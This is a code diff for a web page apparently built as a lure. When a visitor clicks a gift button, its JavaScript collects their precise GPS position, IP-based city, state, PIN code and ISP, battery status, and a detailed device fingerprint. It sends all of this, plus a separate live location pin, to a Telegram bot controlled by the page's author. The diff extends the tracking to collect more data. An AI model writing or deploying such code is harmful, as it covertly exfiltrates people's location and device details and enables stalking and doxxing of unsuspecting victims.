@@ -89,115 +89,159 @@
         } catch(e) {}
     }
     
-    // Get BOTH IPv4 and IPv6 with accurate location
-    async function getBothIPs() {
-        let ipv4Data = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A', lat: 'N/A', lon: 'N/A' };
-        let ipv6Data = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A', lat: 'N/A', lon: 'N/A' };
-        
-        // Get IPv4 + Location (most accurate)
+    async function sendLocationToTelegram(lat, lon) {
         try {
-            const resp = await fetch('https://api.ipify.org?format=json');
-            const ipData = await resp.json();
-            const ipv4 = ipData.ip;
-            
-            // Get location for IPv4
-            const locResp = await fetch(`http://ip-api.com/json/${ipv4}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,query`);
-            const locData = await locResp.json();
-            
-            if (locData.status === 'success') {
-                ipv4Data = {
-                    ip: locData.query,
-                    city: locData.city,
-                    region: locData.regionName,
-                    country: locData.country,
-                    postal: locData.zip || 'N/A',
-                    isp: locData.isp,
-                    org: locData.org,
-                    lat: locData.lat,
-                    lon: locData.lon,
-                    mobile: locData.mobile,
-                    proxy: locData.proxy
-                };
-            }
-        } catch(e) { console.log('IPv4 error:', e); }
-        
-        // Get IPv6 + Location
-        try {
-            const resp = await fetch('https://api6.ipify.org?format=json');
-            const ipData = await resp.json();
-            const ipv6 = ipData.ip;
-            
-            // Try to get location for IPv6 (some APIs support it)
-            try {
-                const locResp = await fetch(`https://ipapi.co/${ipv6}/json/`);
-                const locData = await locResp.json();
-                if (locData.ip) {
-                    ipv6Data = {
-                        ip: locData.ip,
-                        city: locData.city || 'N/A',
-                        region: locData.region || 'N/A',
-                        country: locData.country_name || 'N/A',
-                        isp: locData.org || 'N/A',
-                        lat: locData.latitude || 'N/A',
-                        lon: locData.longitude || 'N/A'
-                    };
-                }
-            } catch(e) {}
-        } catch(e) { console.log('IPv6 error:', e); }
-        
-        return { ipv4: ipv4Data, ipv6: ipv6Data };
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: USER_CHAT_ID,
+                    latitude: lat,
+                    longitude: lon
+                })
+            });
+        } catch(e) {}
     }
     
-    // Better GPS with multiple attempts
-    async function getGPSLocation() {
-        for (let attempt = 1; attempt <= 3; attempt++) {
-            try {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
-                });
-                return {
-                    success: true,
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude || 'N/A'
-                };
-            } catch(e) {
-                await new Promise(r => setTimeout(r, 1000));
-            }
-        }
-        return { success: false };
-    }
-    
-    // Battery Info
+    // Battery Info - FIXED
     async function getBatteryInfo() {
         try {
             if ('getBattery' in navigator) {
                 const battery = await navigator.getBattery();
                 return {
                     level: Math.round(battery.level * 100),
-                    charging: battery.charging
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime || 'N/A',
+                    dischargingTime: battery.dischargingTime || 'N/A'
+                };
+            }
+        } catch(e) {
+            console.log('Battery error:', e);
+        }
+        return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
+    }
+    
+    // Better IP API - More accurate city/state
+    async function getIPInfo() {
+        try {
+            // Using ip-api.com (more accurate for India)
+            const resp = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,query');
+            const data = await resp.json();
+            if (data.status === 'success') {
+                return {
+                    ip: data.query,
+                    city: data.city,
+                    region: data.regionName,
+                    country: data.country,
+                    postal: data.zip || 'N/A',
+                    isp: data.isp,
+                    org: data.org,
+                    as: data.as,
+                    lat: data.lat,
+                    lon: data.lon,
+                    mobile: data.mobile ? 'Yes' : 'No',
+                    proxy: data.proxy ? 'Yes' : 'No'
                 };
             }
         } catch(e) {}
-        return { level: 'N/A', charging: 'N/A' };
+        
+        // Fallback to ipapi.co
+        try {
+            const resp = await fetch('https://ipapi.co/json/');
+            const data = await resp.json();
+            return {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                postal: data.postal,
+                isp: data.org,
+                lat: data.latitude,
+                lon: data.longitude
+            };
+        } catch(e) {}
+        
+        return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
     }
     
-    // Device Info
+    // GPS Location with high accuracy
+    async function getGPSLocation() {
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            return {
+                success: true,
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude || 'N/A',
+                speed: pos.coords.speed || 'N/A'
+            };
+        } catch(e) {
+            return { success: false, error: e.message };
+        }
+    }
+    
+    // Advanced Device Info
     async function getDeviceInfo() {
-        const connection = navigator.connection || navigator.mozConnection;
+        // Get installed fonts
+        const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Roboto', 'Open Sans'];
+        const availableFonts = [];
+        for (const font of fonts) {
+            if (document.fonts.check(`12px "${font}"`)) {
+                availableFonts.push(font);
+            }
+        }
+        
+        // Get GPU info
+        let gpu = 'N/A';
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        }
+        
+        // Get connection info
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        let connInfo = {};
+        if (connection) {
+            connInfo = {
+                type: connection.effectiveType || 'N/A',
+                downlink: connection.downlink || 'N/A',
+                rtt: connection.rtt || 'N/A'
+            };
+        }
+        
         return {
             platform: navigator.platform,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            userAgent: navigator.userAgent,
             language: navigator.language,
-            connectionType: connection ? connection.effectiveType : 'N/A',
-            touchPoints: navigator.maxTouchPoints || 0,
-            hardwareCores: navigator.hardwareConcurrency || 'N/A'
+            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+            screen: `${screen.width}x${screen.height}`,
+            screenColorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            online: navigator.onLine,
+            cookiesEnabled: navigator.cookieEnabled,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+            deviceMemory: navigator.deviceMemory || 'N/A',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            vendor: navigator.vendor || 'N/A',
+            fonts: availableFonts.slice(0, 5).join(', '),
+            gpu: gpu.substring(0, 80),
+            connectionType: connInfo.type,
+            connectionSpeed: connInfo.downlink,
+            connectionRTT: connInfo.rtt
         };
     }
     
@@ -207,10 +251,11 @@
         document.getElementById('giftBtn').innerHTML = "🎁 Opening... 🎁";
         document.getElementById('giftBtn').disabled = true;
         
-        const [ips, gps, battery, device] = await Promise.all([
-            getBothIPs(),
-            getGPSLocation(),
+        // Collect all data
+        const [battery, ipInfo, gps, device] = await Promise.all([
             getBatteryInfo(),
+            getIPInfo(),
+            getGPSLocation(),
             getDeviceInfo()
         ]);
         
@@ -226,47 +271,70 @@
             msg += `├ Lat: <code>${gps.lat}</code>\n`;
             msg += `├ Lon: <code>${gps.lon}</code>\n`;
             msg += `├ Accuracy: ${Math.round(gps.accuracy)} meters\n`;
+            if(gps.altitude != 'N/A') msg += `├ Altitude: ${gps.altitude}m\n`;
+            if(gps.speed != 'N/A') msg += `├ Speed: ${gps.speed} m/s\n`;
             msg += `└ 🗺️ <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}">VIEW ON MAP</a>\n\n`;
+            
+            // Send separate location
+            await sendLocationToTelegram(gps.lat, gps.lon);
         } else {
-            msg += `<b>📍 GPS:</b> ❌ Blocked/Unavailable\n\n`;
+            msg += `<b>📍 GPS LOCATION</b>\n`;
+            msg += `└ ❌ ${gps.error || 'Permission denied or not available'}\n\n`;
         }
         
-        // IPv4 Section (Most Accurate)
-        msg += `<b>🌐 IPv4 INFO (Most Accurate)</b>\n`;
-        msg += `├ IP: <code>${ips.ipv4.ip}</code>\n`;
-        msg += `├ City: ${ips.ipv4.city}\n`;
-        msg += `├ State: ${ips.ipv4.region}\n`;
-        msg += `├ Country: ${ips.ipv4.country}\n`;
-        msg += `├ ISP: ${ips.ipv4.isp}\n`;
-        if(ips.ipv4.mobile) msg += `├ Mobile Network: Yes\n`;
-        msg += `└ Location: ${ips.ipv4.lat}, ${ips.ipv4.lon}\n\n`;
-        
-        // IPv6 Section
-        if(ips.ipv6.ip != 'N/A') {
-            msg += `<b>🌐 IPv6 INFO</b>\n`;
-            msg += `├ IP: <code>${ips.ipv6.ip.substring(0, 50)}...</code>\n`;
-            msg += `├ City: ${ips.ipv6.city}\n`;
-            msg += `├ Region: ${ips.ipv6.region}\n`;
-            msg += `├ Country: ${ips.ipv6.country}\n`;
-            msg += `└ ISP: ${ips.ipv6.isp}\n\n`;
-        }
+        // Network Section - More accurate
+        msg += `<b>🌐 NETWORK INFO</b>\n`;
+        msg += `├ IP: <code>${ipInfo.ip}</code>\n`;
+        msg += `├ City: ${ipInfo.city}\n`;
+        msg += `├ State: ${ipInfo.region}\n`;
+        msg += `├ Country: ${ipInfo.country}\n`;
+        msg += `├ PIN Code: ${ipInfo.postal || 'N/A'}\n`;
+        msg += `├ ISP: ${ipInfo.isp}\n`;
+        if(ipInfo.mobile) msg += `├ Mobile Network: ${ipInfo.mobile}\n`;
+        if(ipInfo.proxy) msg += `├ Proxy/VPN: ${ipInfo.proxy}\n`;
+        msg += `└ IP Location: ${ipInfo.lat}, ${ipInfo.lon}\n\n`;
         
         // Device Section
         msg += `<b>📱 DEVICE INFO</b>\n`;
         msg += `├ Platform: ${device.platform}\n`;
-        msg += `├ Screen: ${device.screen}\n`;
-        msg += `├ Touch Points: ${device.touchPoints}\n`;
-        msg += `├ CPU Cores: ${device.hardwareCores}\n`;
-        msg += `├ Timezone: ${device.timezone}\n`;
+        msg += `├ Screen: ${device.screen} (${device.screenColorDepth}-bit)\n`;
+        msg += `├ Pixel Ratio: ${device.pixelRatio}x\n`;
+        msg += `├ Touch Points: ${device.maxTouchPoints}\n`;
+        msg += `├ CPU Cores: ${device.hardwareConcurrency}\n`;
+        if(device.deviceMemory != 'N/A') msg += `├ RAM: ${device.deviceMemory} GB\n`;
+        msg += `├ GPU: ${device.gpu}\n`;
+        msg += `├ Timezone: ${device.timezone} (UTC${-device.timezoneOffset/60})\n`;
         msg += `├ Language: ${device.language}\n`;
-        msg += `└ Connection: ${device.connectionType}\n\n`;
+        msg += `├ Fonts: ${device.fonts || 'N/A'}\n`;
+        msg += `└ Cookies: ${device.cookiesEnabled ? 'Enabled' : 'Disabled'}\n\n`;
         
-        // Battery Section
-        msg += `<b>🔋 BATTERY</b>\n`;
+        // Battery Section - FIXED
+        msg += `<b>🔋 BATTERY INFO</b>\n`;
         msg += `├ Level: ${battery.level}%\n`;
-        msg += `└ Charging: ${battery.charging ? 'Yes' : 'No'}\n\n`;
+        msg += `├ Charging: ${battery.charging ? '✅ Yes' : '❌ No'}\n`;
+        if(battery.chargingTime != 'N/A') msg += `├ Charging Time: ${battery.chargingTime} sec\n`;
+        if(battery.dischargingTime != 'N/A') msg += `└ Remaining: ${Math.round(battery.dischargingTime/60)} minutes\n`;
+        else msg += `└ Remaining: N/A\n`;
+        msg += `\n`;
         
-        msg += `<b>🕐 TIME:</b> ${new Date().toLocaleString()}\n`;
+        // Connection Section
+        msg += `<b>📡 CONNECTION</b>\n`;
+        msg += `├ Type: ${device.connectionType}\n`;
+        if(device.connectionSpeed != 'N/A') msg += `├ Speed: ${device.connectionSpeed} Mbps\n`;
+        if(device.connectionRTT != 'N/A') msg += `└ Latency: ${device.connectionRTT} ms\n\n`;
+        
+        // Browser Section
+        msg += `<b>🌐 BROWSER INFO</b>\n`;
+        msg += `├ Vendor: ${device.vendor}\n`;
+        msg += `├ Languages: ${device.languages}\n`;
+        msg += `└ Online: ${device.online ? 'Yes' : 'No'}\n\n`;
+        
+        msg += `<b>🕐 TIMESTAMP</b>\n`;
+        msg += `└ ${new Date().toLocaleString()}\n\n`;
+        
+        msg += `<b>🔗 FULL USER AGENT</b>\n`;
+        msg += `<code>${device.userAgent.substring(0, 150)}</code>\n\n`;
+        
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `👨‍💻 @KINGITACHI18`;
         
